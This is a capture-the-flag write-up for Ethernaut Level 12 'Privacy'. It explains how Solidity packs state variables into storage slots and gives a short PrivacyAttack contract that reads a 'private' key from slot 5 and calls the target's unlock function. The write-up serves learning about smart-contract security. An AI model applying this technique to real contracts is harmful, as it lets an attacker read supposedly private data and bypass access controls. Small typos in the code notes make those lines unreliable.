<div align="center">

<img src="../assets/levels/12-privacy.webp" width="600px"/>
<br><br>
<h1><strong>Ethernaut Level 12 - Privacy</strong></h1>

</div>

## Table of Contents

- [Table of Contents](#table-of-contents)
- [Objectif](#objectif)
- [Solution](#solution)
- [Takeaway](#takeaway)
- [References](#references)

## Objectif

<img src="../assets/requirements/12-privacy-requirements.webp" width="800px"/>

Requires a good understanding of how storage works in solidity, and how to access it.

## Solution

Below is the break up of how the state variables fit into different slots.

```
// Slot 0
bool public locked = true;

// Slot 1
uint256 public ID = block.timestamp;

// Slot 2
uint8 private flattening = 10;

// Slot 2
uint8 private denomination = 255;

// Slot 2
uint16 private awkwardness = uint16(block.timestamp);

// Slot 3, 4, 5
bytes32[3] private data;
```

Basically, the info stored at slot 5 is to be passed to the unlock function to clear the level.
Note the usage of `call` with `abi.encodeWithSignature`

```java
contract PrivacyAttack {

	event Response(bool success, bytes data);


	function bytes32ToBytes16(bytes32 data, address privacyContract) public {

		bytes16 convertedBytes = bytes16(data);



	// one way would be to import the abi (which on remix can be done by pasting the code into a file and compiling it)

	// then import it into this contract, create an object and then call

	// method2 would be use call on its address (since we know the function already)

		(bool success, bytes memory data) = privacyContract.call(

			abi.encodeWithSignature("unlock(bytes16)", convertedBytes)

		);



		emit Response(success, data);



		}

}
```

## Takeaway

```
# Storage
- 2 ** 256 slots
- 32 bytes for each slot
- data is stored sequentially in the order of declaration
- storage is optimized to save space. If neighboring variables fit in a single 32 bytes, then they are packed into the same slot, starting from the right

# Format of encodeWithSignature: endocdeWithSignature(functionName("function param type)", param)
```

## References

- https://solidity-by-example.org/hacks/accessing-private-data/
- https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/

<div align="center">
<br>
<h2>🎉 Level completed! 🎉</h2>
</div>
